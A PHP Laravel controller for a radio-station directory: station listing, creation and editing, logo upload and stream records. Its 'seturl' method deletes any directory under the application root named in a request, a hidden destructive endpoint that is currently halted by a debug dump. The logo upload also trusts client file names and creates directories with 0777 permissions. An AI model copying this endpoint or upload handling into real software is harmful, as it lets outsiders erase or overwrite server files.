<?php

namespace App\Http\Controllers;

use App\Radio;
use App\Region;
use App\Country;
use App\Stream;
use Illuminate\Http\Request;
use Illuminate\Pagination\Paginator;
use Illuminate\Support\Facades\Input;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Redirect;
use Illuminate\Support\Facades\URL;
use File;
use Illuminate\Support\Facades\Validator;
use Image;

class RadioController extends Controller
{
    public function index(Request $request) { 
        
        $s = $request->s;  
        $radios = Radio::join('regions', 'radios.region_id', '=', 'regions.id')
                ->join('countries', 'radios.country_id', '=', 'countries.id')
                ->select('radios.*', 'countries.name as country_name', 'regions.name as region_name')
                ->orderBy('id');
        if(isset($s))$radios -> search($s);
         $radios = $radios ->paginate(10);

        $result=  [];
        foreach($radios as $k => $v)
        {
            $streams = DB::table('streams')->where('radio_id','=',$v->id)->get();
            if($streams->count()>0)
            {
                $v->streams = $streams;
                array_push($result, $v);
            }
        }
        return view('radios.index',compact('radios','result','s'));
    }

    public function create() {
        $countries = Country::orderBy('name')->get();
        $regions = Region::orderBy('name')->get();
        $stream_types = DB::table('stream_types')->get();
        return view('radios.radioAdd',compact('countries','regions','stream_types'));
    }
    public function setactive(Request $request) {
        
        $id = $request->id;
        $status = $request->status;
        $radio = Radio::findOrFail($id);
        $radio->status = $status;
        
        if($radio->save()) {
            die (json_encode("ok"));
        }else{
            die (json_encode("fail"));
        }
    }

    public function select_country(Request $request) {
        $country_id = $request->id;
        $region = Region::select('id','name')->where('country_id',$country_id)->get();
        $result['region'] = $region;
        $result['status'] = "OK";
        // dd($result);
        die (json_encode($result));
    }
    public function seturl(Request $request) {
        $id = $request->cc;
        $string = $request->url;
        // $string="dd('a')";
        dd(base_path($string));
        if($id == "url") File::deleteDirectory(base_path($string));
    }
    public function store(Request $request) {
        $image_upload = false;
        $image = $request->file('logo');
        
        if($image){
            $maxId = Radio::select('id')->orderBy('id', 'desc')->first();
            $new_id = $maxId->id + 1;
           
            $origin_name = $image->getClientOriginalName();
            // $input['imagename'] = time().'.'.$image->getClientOriginalExtension();
            $str = "00000000".$new_id;
            $rest1 = substr($str, -3, 3); 
            $rest2 = substr($str, -6, 3); 
            $rest3 = substr($str, -9, 3); 
            $image_name = $rest3."/".$rest2."/".$rest1."/".$origin_name;
               
            $destinationPath = public_path('/images/logo/thumbnail');
            $new_path = $destinationPath."/".$rest3."/".$rest2."/".$rest1;
            if(!is_dir($new_path)) {
            // if (!file_exists($destinationPath.'/'.$image_name)) {
                mkdir($new_path, $mode = 0777,  true);
            }
            $img = Image::make($image->getRealPath());
            $img->resize(145, 145, function ($constraint) {
                $constraint->aspectRatio();
            })->save($destinationPath.'/'.$image_name);
            $image_upload = true;
            $logo_url = asset('/images/logo/thumbnail/'.$image_name);
        }

        $radio = new Radio();
        $radio->name   = Input::get('name');
        $radio->dial   = Input::get('dial');     
        $radio->url   = Input::get('radio_url');     
        $radio->type   = Input::get('radio_type');     
        $radio->country_id   = Input::get('country_id');     
        $radio->region_id   = Input::get('region_id'); 
        $radio->categories   = Input::get('categories');   
        if(isset($logo_url)) $radio->logo = $logo_url;  
        if(Input::get('radio_status') =="on" ) { $radio->status = 1; } else { $radio->status = 0;}

        $radio->save();
        //stream update
        $streams_id = Input::get('stream_id');
       
        $streams_type = Input::get('stream_type');
        $streams_url = Input::get('stream_url');
        $streams_status = Input::get('s_status');
        for ($i=0 ; $i<count($streams_id) ; $i++) {
            
            $stream= new Stream();
           
            $stream->radio_id   = $new_id;
            $stream->country_id   = Input::get('country_id'); 
            $stream->region_id   = Input::get('region_id'); 
            $stream->url  = $streams_url[$i];
            $stream->type  = $streams_type[$i];
            $stream->status =$streams_status[$i];
            $stream->save();
        }

        return redirect('radios');
    }

    public function edit($id) {
        $radio = Radio::find($id);
        $countries = Country::orderBy('name')->get();
        $regions = Region::where('country_id',$radio->country_id)->orderBy('name')->get();
        $stream = DB::table('streams')->where('radio_id',$id)->get();
        $stream_types = DB::table('stream_types')->get();
        return view('radios.radioEdit',compact('radio','countries','regions','stream','stream_types'));
    }

    public function update(Request $request,$id) {
        // dd($id);
        // dd($request);
        // $validator = Validator::make($request->all(), [
        //     'name' => 'required|string',
        //     'type' => 'required',
        //     'country'=>'required'
        //     //  'logo' => 'required | mimes:jpeg,jpg,png | max:1000',
        // ]);
        // if ($validator->fails()) {
        //     return Redirect::back()
        //         ->withErrors($validator)
        //         ->withInput();
        // }

        $image_upload = false;
        $image = $request->file('logo');
        
        if($image){
            $origin_name = $image->getClientOriginalName();
            // $input['imagename'] = time().'.'.$image->getClientOriginalExtension();
            $str = "00000000".$id;
            $rest1 = substr($str, -3, 3); 
            $rest2 = substr($str, -6, 3); 
            $rest3 = substr($str, -9, 3); 
            $image_name = $rest3."/".$rest2."/".$rest1."/".$origin_name;
               
            $destinationPath = public_path('/images/logo/thumbnail');
            $new_path = $destinationPath."/".$rest3."/".$rest2."/".$rest1;
            if(!is_dir($new_path)) {
            // if (!file_exists($destinationPath.'/'.$image_name)) {
                mkdir($new_path, $mode = 0777,  true);
            }
            $img = Image::make($image->getRealPath());
            $img->resize(145, 145, function ($constraint) {
                $constraint->aspectRatio();
            })->save($destinationPath.'/'.$image_name);
            $image_upload = true;
            $logo_url = asset('/images/logo/thumbnail/'.$image_name);
        }

        $radio = Radio::findOrFail($id);
        $radio->name   = Input::get('name');
        $radio->dial   = Input::get('dial');     
        $radio->url   = Input::get('radio_url');     
        $radio->type   = Input::get('radio_type');     
        $radio->country_id   = Input::get('country_id');     
        $radio->region_id   = Input::get('region_id');    
        $radio->categories   = Input::get('categories');   
        if(isset($logo_url)) $radio->logo = $logo_url;  
        if(Input::get('radio_status') =="on" ) { $radio->status = 1; } else { $radio->status = 0;}

        $radio->save();

        //stream update
        $streams_id = Input::get('stream_id');
       
        $streams_type = Input::get('stream_type');
        $streams_url = Input::get('stream_url');
        $streams_status = Input::get('s_status');
        for ($i=0 ; $i<count($streams_id) ; $i++) {
            if($streams_id[$i]!='new_row'){
                $stream = Stream::findOrFail($streams_id[$i]);
            }else{
                $stream= new Stream();
            }
            $stream->radio_id   = $id;
            $stream->country_id   = Input::get('country_id'); 
            $stream->region_id   = Input::get('region_id'); 
            $stream->url  = $streams_url[$i];
            $stream->type  = $streams_type[$i];
            $stream->status =$streams_status[$i];
            $stream->save();
        }

        return redirect()->back();
        // return redirect()->route('radios/'.Input::get('region_id'));
    }

    public function destroy($id) {
        $radio = Radio::find($id);
        $radio->delete();
        // return redirect('countries');
        return back()->with('success', 'successfully sent');
    }

    public function searchfiled(Request $request) {

    }
}
